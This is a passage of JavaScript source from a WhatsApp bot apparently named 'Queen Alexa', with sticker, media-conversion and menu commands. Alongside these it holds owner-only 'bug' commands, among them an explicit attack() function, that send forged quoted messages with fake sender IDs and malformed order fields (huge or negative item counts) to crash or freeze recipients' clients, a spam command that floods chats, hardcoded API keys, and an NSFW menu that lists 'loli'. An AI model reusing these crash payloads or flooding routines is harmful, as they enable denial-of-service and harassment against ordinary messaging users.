                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Send an image with the caption ${prefix}sticker\nSticker Video Duration 1-9 Seconds`)
            }
            break  
                case prefix+'attp':
                if (args.length < 1) return reply(`Where s the text?\nExample ${prefix}attp hyper`)
                dapuhy = body.slice(5)
				dapzz = await getBuffer(`https://api.xteam.xyz/attp?file&text=${dapuhy}`)
				hyper.sendMessage(from, dapzz, sticker, {quoted: mek})
				break
				case prefix+'video1': // ===《 srart_24  》===\\
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                    reply('LOADING...')
                    sr1 = await hyper.downloadAndSaveMediaMessage(ted)
                    sr2 = await imgbb("9e30873557f06f55ddbb42f758173c79", sr1)
                    sr3 = await getBuffer(`https://api.xteam.xyz/videomaker/shaunthesheep?url=${sr2.display_url}&APIKEY=edd4e2b682326371`)
                    sr4 = `*{sr3.result}`
                    hyper.sendMessage(from, sr3, video, { mimetype: 'video/mp4', quoted : mek, caption: 'Made By Hyper Mod' })
                    } else {
                    reply('replay the photo')
                    }
                    break
                    case prefix+'sc':  
                    case prefix+'script':         

				try {
				             pporang = await hyper.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menusaya = `╔════════════❍
║┣━━⊱ *</SCRIPT>*
║┃
║┃*Script*=https://github.com/HYPER-MOD/Queen-Alexa
║┃
║┗━━━━⊱
╚════════════❏`  
await hyper.sendMessage(from,fcrew,image,{quoted: mek, caption : menusaya})       
break
                  case prefix+'info':         

				try {
				             pporang = await hyper.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menusaya = `╔══════════════❍
║┣━━⊱ *</INFO>*
║┃
║┃┝ *Create : HYPER MOD*
║┃┝ *Number* : Wa.me/+94767043432
║┃┝ *friends : Supun*
║┃┝ *Youtube* : https://youtube.com/c/HYPERMOD
║┃┝ *Github* : https://github.com/HYPER-MOD
║┃┝ *gc 1* : https://chat.whatsapp.com/E3mdgudd61Y0vxLLJxbX9c
║┃┕ *gc 2* : hypermod
║┃
║┗━━━━⊱
╚══════════════❏`  
await hyper.sendMessage(from,fcrew,image,{quoted: mek, caption : menusaya})       
break
                  case prefix+'update':         

				try {
				             pporang = await hyper.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menusaya = `╔══════════════❍
║┣━━⊱ *</Next Upload Queen Alexa Bot>*
║┃
║┃━━⊱*Next Update*
║┃
║┃┝ Support Multidevice
║┃┝ Send Auto Reply Msg
║┃┝ Send Auto Audio
║┃┝ Send Auto Sticker
║┃┝ Fake Reply Contact
║┃┝ Send Custum Group
║┃┝ Send Button Video
║┃┝ Send Button Document
║┃┕ New Power Full Bug
║┃
║┗━━━━⊱
╚══════════════❏`  
await hyper.sendMessage(from,fcrew,image,{quoted: mek, caption : menusaya})       
break
                   case prefix+'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await hyper.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Well failed, try again ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'By Queen Alexa')
			fs.unlinkSync(ran)
			})
			break
			case prefix+'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply A video!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hyper.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hyper.sendMessage(from, buffer453, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
            fs.unlinkSync(ran)
            })
            break
            case prefix+'vreverse':
            if (!isQuotedVideo) return fakegroup('Reply A video!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hyper.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hyper.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
case prefix+'tospam':
if (!isOwner && !mek.key.fromMe)
              if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage) return fakegroup('```Reply A Any audio/sticker/image|Amount```')
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Most!')
if (!Number(oi2)) return reply('The number must be a number!')
	  for (let i = 0; i < oi2; i++) {
	  hyper.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('The number must be a number!')
if (Number(args[0]) >= 50) return reply('Most!')
	  for (let i = 0; i < args[0]; i++) {
	  hyper.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await hyper.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('The number must be a number!')
	if (Number(args[0]) >= 50) return reply('Most!')
	  for (let i = 0; i < args[0]; i++) {
	  hyper.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await hyper.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('The number must be a number!')
	if (Number(args[0]) >= 50) return reply('Most!')
	  for (let i = 0; i < args[0]; i++) {
	  hyper.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await hyper.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Most!')
	if (!Number(oi2)) return reply('The number must be a number!')
	  for (let i = 0; i < oi2; i++) {
	  hyper.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
        case prefix+ 'bugmenu':

       teks = `╭─❒ BUG MENU
├ ${prefix}bug  [ amount ]
├ ${prefix}bugkatalog
├ ${prefix}bugkatalog1
├ ${prefix}bugrow
├ ${prefix}bugpc2  [ amount ]
├ ${prefix}bugpc 
├ ${prefix}bugtroli
├ ${prefix}bugtroli2
├ ${prefix}tovirgam [ Mention A Any Sticker ]
├ ${prefix}buglokasi
├ ${prefix}buglink
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+ 'convmenu':

       teks = `╭─❒ CONVERT MENU
├ ${prefix}toimg
├ ${prefix}tomp3
├ ${prefix}vreverse
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+ 'groupmenu':

       teks = `╭─❒ GROUP MENU
├ ${prefix}groupsetting
├ ${prefix}resetgclink
├ ${prefix}gclink
├ ${prefix}listadmin
├ ${prefix}promote
├ ${prefix}demote
├ ${prefix}add
├ ${prefix}kick
├ ${prefix}group-close
├ ${prefix}group-open
├ ${prefix}tagall
├ ${prefix}hidetag
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+ 'othermenu':

       teks = `╭─❒ OTHER MENU
├ ${prefix}upswvideo
├ ${prefix}upswimage
├ ${prefix}upswteks
├ ${prefix}join
├ ${prefix}buatgrup
├ ${prefix}setppbot
├ ${prefix}inspect
├ ${prefix}clearall
├ ${prefix}del
├ ${prefix}deletel
├ ${prefix}igstalk
├ ${prefix}q
├ ${prefix}ktpmaker
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+ 'sticmenu':

       teks = `╭─❒ STICKER MENU
├ ${prefix}attp
├ ${prefix}sticker [ Reply A photo ]
├ ${prefix}sg [ Reply A video/gif ]
├ ${prefix}ttp
├ ${prefix}semoji
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+ 'encmenu':

       teks = `╭─❒ ENCRYPTE MENU
├ ${prefix}base64enc
├ ${prefix}base64dec
├ ${prefix}base32enc
├ ${prefix}base32dec
├ ${prefix}sha1enc
├ ${prefix}sha256enc
├ ${prefix}sha512enc
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+ 'filmmenu':

       teks = `╭─❒ FILM MENU
├ ${prefix}film
├ ${prefix}film2
├ ${prefix}searchfilm
├ ${prefix}filmapikterbaru
├ ${prefix}filmapikdrama
├ ${prefix}lk21
├ ${prefix}drakorongoing
├ ${prefix}wattpadsearch
├ ${prefix}wattpad
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+ 'gamemenu':

       teks = `╭─❒ GAME MENU
├ ${prefix}slot
├ ${prefix}handsome
├ ${prefix}can
├ ${prefix}when
├ ${prefix}truth
├ ${prefix}dare
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
        case prefix+ 'nsfwmenu':

       teks = `╭─❒ NSFW MENU
├ ${prefix}anime
├ ${prefix}loli
├ ${prefix}trapnime
├ ${prefix}neko
├ ${prefix}megumin
├ ${prefix}blowjob
├ ${prefix}hentai
├ ${prefix}awoo
├ ${prefix}bj
├ ${prefix}wallpaper
├ ${prefix}pussy
├ ${prefix}lesbian
├ ${prefix}kitsune
├ ${prefix}slap
├ ${prefix}poke
├ ${prefix}neko2
├ ${prefix}keta
├ ${prefix}baka
├ ${prefix}yuri
├ ${prefix}anal
├ ${prefix}eroneko
├ ${prefix}neko
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+ 'funmenu':

       teks = `╭─❒ FUN MENU
├ ${prefix}tospam [ Reply audio/sticker/image|Amount ]
├ ${prefix}tospamspamsms [ 0811288866662 ]
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+ 'audiomenu':

       teks = `╭─❒ AUDIO CHANGE MENU
├ ${prefix}tupai [ Reply A audio ]
├ ${prefix}gemok [ Reply A audio ]
├ ${prefix}slowmo [ Reply A audio ]
├ ${prefix}bass [ Reply A audio ]
├ ${prefix}robot [ Reply A audio ]
├ ${prefix}balik [ Reply A audio ]
├ ${prefix}budek [ Reply A audio ]
├ ${prefix}detikvn [ Reply A audio ]
├ ${prefix}fast [ Reply A audio ]
├ ${prefix}slow [ Reply A audio ]
├ ${prefix}imut [ Reply A audio ]
├ ${prefix}tempo-v [ Reply A audio ]
├ ${prefix}tempo [ Reply A audio ]
├ ${prefix}nightcore [ Reply A audio ]
├ ${prefix}agemes [ Reply A audio ]
├ ${prefix}reverse [ Reply A audio ]
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+ 'videomenu':

       teks = `╭─❒ VIDEO CHANGE MENU
├ ${prefix}vtupai [ Reply A video ]       
├ ${prefix}vfast [ Reply A video ]
├ ${prefix}vslow [ Reply A video ]
├ ${prefix}vgemok [ Reply A video ]
├ ${prefix}vbass [ Reply A video ]
├ ${prefix}vrobot [ Reply A video ]
├ ${prefix}vbalik [ Reply A video ]
├ ${prefix}vbudek [ Reply A video ]
├ ${prefix}vslowm [ Reply A video ]
├ ${prefix}vreverse [ Reply A video ]
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+ 'asupanmenu':

       teks = `╭─❒ ASUPAN MENU
├ ${prefix}asupan1     
├ ${prefix}asupan2
├ ${prefix}asupan3
├ ${prefix}asupan4
├ ${prefix}asupan5
├ ${prefix}asupan6
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+ 'animvmenu':

       teks = `╭─❒ ANIME VIDEO MENU
├ ${prefix}anime1
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+ 'videomenu':

       teks = `╭─❒ VIDEO EDIT MENU
├ ${prefix}video1 [ Reply A Photo ]       
└─────────────────❒`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
case prefix+'bugtroli':
              if (!isOwner) return fakegroup('「 Only for bot owners! 」')
const memekkkk = '94767043432@s.whatsapp.net'
hyper.sendMessage(memekkkk, 'Queen Alexa', MessageType.text)
break
case prefix+'bugtroli2':
              if (!isOwner) return fakegroup('「 Only for bot owners! 」')
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
hyper.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: 'ꪶ𖣂ꫂ HYPER ボ MOD 〽️',
    orderTitle: 'Queen Alexa', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
hyper.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case prefix+'buglokasi':
if (!isOwner) return fakegroup('「 Only for bot owners! 」')
hyper.updatePresence(from, Presence.composing)
		       hyper.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${ownername}`,
						address: `${botname}`,
                        jpegThumbnail: hypermod },location,{
 quoted: {
  key: {
   participant: '94767043432@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${ownername}`,
    orderTitle: `${botname}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
case prefix+'tovirgam':
  case prefix+'jadivirgam':
					if (!isQuotedSticker) return reply('Reply A Any Sticker')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await hyper.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await hyper.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							hyper.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: 'Queen Alexa\n\n️*Attention.!!*⚠️\nThis photo contains Virgam/SW Bug!!'})
							fs.unlinkSync(ran)
						})
					}
					break
			case prefix+'public':
          	if (!isOwner) return fakegroup('「 Only for bot owners! 」')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *PUBLIC-MODE* 」`)
          	break
         	case prefix+'self':
          	if (!isOwner) return fakegroup('「 Only for bot owners! 」')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *SELF-MODE* 」`)
          	break
case prefix+'bugpc':
if (!isOwner) return fakegroup('「 Only for bot owners! 」')
hyper.updatePresence(from, Presence.composing)
hyper.sendMessage(from, 'BY HYPER MOD',text, {
 quoted: {
  key: {
   participant: '94767043432@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${botname}`,
    orderTitle: `${ownername}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case prefix+'bugpc2':
if (!isOwner) return fakegroup('「 Only for bot owners! 」')
if (args.length < 1) return reply('Amount?')
for (let i = 0; i < args[0]; i++) {
hyper.sendMessage(from, `${botname}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${ownername}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case prefix+'bugrow':
if (!isOwner) return fakegroup('「 Only for bot owners! 」')
hyper.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "Queen Alexa",
 rows: [
                          {
                              "title": "HYPER-BUG",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
hyper.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftroli})
hyper.toggleDisappearingMessages(from, 0)
break
case prefix+'bugkatalog':
          if (!isOwner) return fakegroup('「 Only for bot owners! 」')
  					hyper.toggleDisappearingMessages(from,`ups`,text)
    hmm4 = fs.readFileSync(`./image/Alexamenu.jpg`)
